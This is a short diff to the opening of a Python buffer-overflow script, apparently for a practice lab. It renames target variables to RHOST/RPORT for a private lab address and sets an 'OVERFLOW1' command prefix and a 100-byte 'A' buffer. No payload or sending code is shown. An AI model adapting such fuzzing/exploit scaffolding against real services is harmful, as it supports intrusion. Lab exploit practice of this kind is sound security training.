@@ -1,9 +1,8 @@
 #! /usr/bin/python3
-
 import socket, time, sys
 
-IP = '192.168.56.1'
-PORT = 1337
+RHOST = '192.168.56.1'
+RPORT = 1337
 
 prefix = b'OVERFLOW1 '
 buffer = b'A' * 100
